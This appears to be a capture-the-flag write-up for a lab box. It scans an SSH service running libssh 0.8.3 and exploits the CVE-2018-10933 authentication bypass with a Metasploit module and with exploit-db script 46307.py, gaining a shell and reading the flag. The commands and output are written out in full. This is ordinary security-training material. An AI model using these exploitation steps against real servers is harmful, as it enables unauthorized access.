#  NetworkBy

## Nmap Version Enum

```bash

$ nmap -sV -sC  docker.h4x0rbox.com -p 2200
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-28 15:50 IST
Nmap scan report for docker.h4x0rbox.com (10.10.10.201)
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
2200/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
| ssh-hostkey: 
|_  2048 47:27:9c:d0:92:61:00:93:dc:e0:79:c1:09:4d:5f:c7 (RSA)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.80 seconds


```


## Enums


 Vulnerability Details : [CVE-2018-10933](https://www.cvedetails.com/cve/CVE-2018-10933/ "CVE-2018-10933 security vulnerability details") [(1 Metasploit modules)](https://www.cvedetails.com/cve/CVE-2018-10933/#metasploit)

```bash

msf6 > search libssh

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  No     libssh Authentication Bypass Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ssh/libssh_auth_bypass

msf6 > 



```

## Exploitation

#### MSF module (module not working properly)

```bash

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set rhosts docker.h4x0rbox.com
rhosts => docker.h4x0rbox.com
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > set rport 2200
rport => 2200
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > show options 

Module options (auxiliary/scanner/ssh/libssh_auth_bypass):

   Name          Current Setting      Required  Description
   ----          ---------------      --------  -----------
   CHECK_BANNER  true                 no        Check banner for libssh
   CMD                                no        Command or alternative shell
   RHOSTS        docker.h4x0rbox.com  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         2200                 yes       The target port
   SPAWN_PTY     false                no        Spawn a PTY
   THREADS       1                    yes       The number of concurrent threads (max one per host)


Auxiliary action:

   Name   Description
   ----   -----------
   Shell  Spawn a shell


msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 10.10.10.201:2200 - Attempting authentication bypass
[*] Command shell session 1 opened (10.90.90.117:37415 -> 10.10.10.201:2200) at 2021-03-28 15:57:30 +0530
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions 

Active sessions
===============

  Id  Name  Type   Information                                                  Connection
  --  ----  ----   -----------                                                  ----------
  1         shell  libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3)  10.90.90.117:37415 -> 10.10.10.201:2200 (10.10.10.201)

msf6 auxiliary(scanner/ssh/libssh_auth_bypass) > 

```


#### Using exploit.py

```bash

$ searchsploit libssh 0.8
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                                                                                                                      | linux/remote/46307.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ searchsploit -m linux/remote/46307.py
  Exploit: LibSSH 0.7.6 / 0.8.4 - Unauthorized Access
      URL: https://www.exploit-db.com/exploits/46307
     Path: /usr/share/exploitdb/exploits/linux/remote/46307.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/guru/Desktop/secure7/ctf/bin/46307.py


```

```bash
$ python3 46307.py docker.h4x0rbox.com 2200 'cat flag.txt'
/home/guru/.local/lib/python3.8/site-packages/paramiko/rsakey.py:127: CryptographyDeprecationWarning: signer and verifier have been deprecated. Please use sign and verify instead.
  verifier = key.verifier(
Sl7{LibSSH-byPASS_NinjA2}

```

### Flag : ` Sl7{LibSSH-byPASS_NinjA2} `